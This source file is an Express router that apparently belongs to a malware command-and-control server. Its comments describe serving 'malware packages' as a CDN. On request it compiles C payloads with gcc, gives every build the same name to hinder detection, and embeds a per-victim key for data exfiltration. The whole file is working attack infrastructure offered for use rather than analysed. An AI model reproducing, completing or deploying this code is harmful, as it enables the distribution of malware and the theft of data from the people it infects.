const express = require('express');
const EXE_DATA = require("./exe_datas.js");
const Auth = require("./auth.js");
const { genAsciiStr } = require("./util.js");
const { execFileSync } = require("child_process");
const path = require("path");
const logging = require("./logging.js");

// This router will handle the GET requests that ask to retrieve a specified malware.
// The routing is very simple here since GET requests simply act as a CDN for our malware packages
const getReqRouter = express.Router({
    mergeParams: true
});

// Create a middleware that checks for authentication. See auth.js for more info on how that's done
getReqRouter.get("*", (request, response, next) => {
    
    let authKey = Auth.getKeys.getWithHash(request.headers.authorization);
    
    if (authKey == null)
    {
        // If unauthorized, send a random 64 bit ASCII
        response.status(401);
        logging.log(`🔨 GET request denied for IP ${request.ip} due to invalid auth key '${request.headers.authorization}'.`)
        response.send(genAsciiStr(64));
    }
    else
    {
        next();
    }
});

// If default URL + authenticated, send appropriate EXE file
getReqRouter.get("/", (request, response, next) => {

    // We're going to compile all the C files with the same name to make it harder to detect what our malware does
    const exeName = "RemoteCode.exe";

    // We're using the JSON in EXE_DATA to prevent external machines from trying to run a file inclusion attack
    let reqEXEData = EXE_DATA[request.headers.exe];

    if (EXE_DATA[request.headers.exe])
    {
        // Compiling might throw errors - here's where we catch that.
        try
        {
            if (reqEXEData.usesAuthKey)
            {
                var authKey = genAsciiStr(512);
                
                // Make sure to register the actual AuthKey
                Auth.postKeys.setWithHash(authKey, new Auth.Keys(authKey, request.ip, reqEXEData.singleUse, request.headers.exe));

                // Now, compile the GCC with a newly generated POST Authkey (if necessary) that will be used to when exfiltrating data
                // Spawning subprocesses is always very dangerous, but we mitigate this by not spawning a shell and basically having prepared statements
                // See auth.js for more about how the Authentication is designed
                execFileSync("gcc", [reqEXEData.cPath, `-D postKey=${authKey}`, `-o`, exeName])
            }
            else
            {
                execFileSync("gcc", [reqEXEData.cPath, `-o`, exeName])
            }

            logging.log(`C file ${reqEXEData.cPath} from ${request.ip} compiled!`);
        }
        catch(err)
        {
            logging.error(`Error in compiling C file ${reqEXEData.cPath} from ${request.ip}: ${err}`);
            response.status(500);
            next();
        }

        // Use path to find the EXE file. It should be in the same directory under $exeName
        var cDir = path.dirname(reqEXEData.cPath);          // 🤣 not to be confused with CDIR
        let exePath = path.resolve(cDir, `./${exeName}`);

        // Send the EXE file
        response.sendFile(exePath, (err) => {
            if (err)
            {
                logging.error(`🔨 Error in sending file ${exePath} to ${request.ip}: ${err}`);
                response.status(500);
                next();
            }
            else
            {
                logging.log(`🔨 EXE file ${exePath} sent to ${request.ip}.`);
            }
        });
    }
    else
    {
        logging.log(`🔨 GET request denied for IP ${request.ip} due to invalid EXE file '${request.headers.exe}'.`)
        response.status(401);
        next();
    }
});

module.exports = getReqRouter;